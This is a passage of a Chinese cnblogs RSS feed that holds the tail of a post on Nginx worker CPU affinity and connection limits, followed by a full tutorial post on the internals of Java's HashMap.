#work 绑定 cpu(4 work 绑定 4cpu)。
worker_cpu_affinity 0001 0010 0100 1000
#work 绑定 cpu (4 work 绑定 8cpu 中的 4 个) 。
worker_cpu_affinity 0000001 00000010 00000100 00001000
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;连接数 worker_connection&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这个值是表示每个 worker 进程所能建立连接的最大值，所以一个 nginx 能建立的最大连接数，应该是 &lt;code&gt;worker_connections * worker_processes&lt;/code&gt;。当然这里说的是最大连接数，对于HTTP 请 求 &lt;code&gt;本 地 资 源&lt;/code&gt; 来 说 能 够 支 持 的 &lt;code&gt;最 大 并 发 数 量&lt;/code&gt; 是 &lt;code&gt;worker_connections * worker_processes&lt;/code&gt;，如果是支持 http1.1 的浏览器每次访问要占两个连接，所以普通的静态访问&lt;code&gt;最大并发数&lt;/code&gt;是： &lt;code&gt;worker_connections * 、worker_processes /2&lt;/code&gt;，而如果是 HTTP 作为&lt;code&gt;反向代理来&lt;/code&gt;说，&lt;code&gt;最大并发数量&lt;/code&gt;应该是 &lt;code&gt;worker_connections * worker_processes/4&lt;/code&gt;。因为作为反向代理服务器，每个并发建立与客户端的连接和与后端服务的连接会占用两个连接。&lt;/p&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/Nginx/20210114001632.png&quot; alt=&quot;image-20210114001632413&quot;/&gt;</description>
<pubDate>Wed, 13 Jan 2021 16:30:00 +0000</pubDate>
<dc:creator>MPolaris</dc:creator>
<og:description>1. Nginx简介 1.1 Nginx 的应用场景 Nginx (&amp;amp;quot;engine x&amp;amp;quot;) 是一个 高性能的 HTTP 和反向代理服务器，特点是占有内存少，并发能力</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/mpolaris/p/14275163.html</dc:identifier>
</item>
<item>
<title>java进阶(29)--HashMap集合 - Mrwhite86</title>
<link>http://www.cnblogs.com/mrwhite2020/p/14275180.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/mrwhite2020/p/14275180.html</guid>
<description>&lt;p&gt;&lt;span&gt;&lt;strong&gt;一、HashMap简介&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;1、HashMap底层是哈希表结构，类似字典，初始化如下：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1767782/202101/1767782-20210113232843773-2059457351.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;2、哈希表结构：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;是一个数组+单向链表的结构体&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;数组：查询效率较高，随机增删效率很低&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;单向链表：在随机增删方面效率较高，查询方面效率很低&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;哈希表将以上两种数据结构融合在一起，充分发挥它们各自的优点。&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;3、HashMap集合底层是数组，Node&amp;lt;k,v&amp;gt;[]tables;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;hash为哈希值，是HashCode方法执行的结果，通过哈希算法可以转换为数组的下标；&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;key，value为Map的key与value，next为下一个内存地址&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1767782/202101/1767782-20210113233348495-1224934449.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;4、map.put(k,v)的实现原理&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;k，v封装到Node对象内，底层调用hashCode()方法得出hash值，通过哈希算法/哈希函数，将hash值转换成数组下标。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;如果下标对应的位置上面没有元素，Node添加到位置上；&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;如果下标对应的位置上有链表，拿k与链表每个节点k进行equals，如所有equals方法都false，新节点将添加到尾部；&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;如果有一个euals返回true，那么这个节点的value值将会覆盖&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;5、map.get(k)的实现原理&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;调用k的hashCode()方法得出哈希值，通过哈希算法转换成数组下标，通过数组下标快速定位到某个位置，位置上什么都没有话，返回null；&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;如果这个位置上有单向链表，那么会拿着参数k和单向链表上每个节点的k进行equals，如果所有的equals返回false，囊二get方法返回null。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;主要其中某一个节点的k和参数k equals返回true，那么此时这个节点的value就是我们要找的value，既为get方法的最终返回value&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;6、HashMap的key部分元素需要重写equals方法hashCode方法。也就是hashSet集合中的元素需要重写equals方法hashCode方法。&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;7、HashMap使用不当时会发生性能问题：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;假设所有的hashCode方法返回值都相等，那么底层会变成单向链表，即散列分布不均匀。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;什么是散列分布均匀：100个元素，10个单向链表，每个单向链表中包含10个节点。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;假设所有的hashCode方法返回均不一样，那么底层会变成数组，即散列分布不均匀。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;散列分布均匀需要重写hashCode方法有一定的技巧&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;8、HashMap集合底层数组达到75%容量时，数组是开始扩容，默认数组容量为16，初始化容量必须是2的倍数，为达到散列分布均匀，且可以提高hashMap集合存取效率。&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;9、HashMap元素存取什么时候不需要执行equals方法：k.hashCode方法返回的哈希值的数组下标位置为null的时候，equals不再需要执行。&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;10、HashMap JDK8改进：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;如果哈希表的单向链表中元素&amp;gt;8，单向链表会变成红黑树，当红黑树上节点数量&amp;lt;6，会重新把红黑数变成单向链表&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;11、哈希表数据结构注意事项：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;如果o1与o2的hash值相同，一定在同一个单向链表上，&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;如果o1与o2的hash值不同，但由于哈希算法执行结束后转换的数组下标可能相同，此时会发生“哈希碰撞”&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt;二、实例说明：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;1、测试HashMap元素特点：key为integer，它的hashCode与equals均已经被重写&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1767782/202101/1767782-20210113235953356-103308604.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;2、遍历Map集合-元素将被无须取出&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1767782/202101/1767782-20210114000438999-975362734.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;3、重写quals与hashCode方法&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;未重写hashCode与equals&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1767782/202101/1767782-20210114001619395-1739961235.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt; &lt;span&gt;重写hashCode与equals后&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1767782/202101/1767782-20210114002228627-1998634706.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt; &lt;span&gt;4、HashMap的key与value可以为空吗，&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;HashMap可以，Hashtable则不行&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1767782/202101/1767782-20210114002706250-1661583273.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
</description>
<pubDate>Wed, 13 Jan 2021 16:29:00 +0000</pubDate>
<dc:creator>Mrwhite86</dc:creator>
<og:description>一、HashMap简介 1、HashMap底层是哈希表结构，类似字典，初始化如下： 2、哈希表结构： 是一个数组+单向链表的结构体 数组：查询效率较高，随机增删效率很低 单向链表：在随机增删方面效率较</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/mrwhite2020/p/14275180.html</dc:identifier>
</item>
</channel>
</rss>